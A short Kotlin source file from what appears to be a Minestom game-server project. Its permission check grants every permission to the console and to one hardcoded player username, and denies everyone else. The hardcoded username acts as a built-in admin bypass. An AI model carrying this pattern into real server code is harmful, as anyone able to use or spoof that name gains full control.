package club.tesseract.immortal.permission

import net.minestom.server.command.CommandSender
import net.minestom.server.command.ConsoleSender
import net.minestom.server.entity.Player

object PermissionUtils {

    fun CommandSender.hasPermission(permission: String): Boolean {
        if (this is ConsoleSender) return true
        if (this is Player) {
            if (this.username == "tropicalshadow") return true
        }
        return false
    }

    internal fun refreshPrefix(player: Player) {

    }
}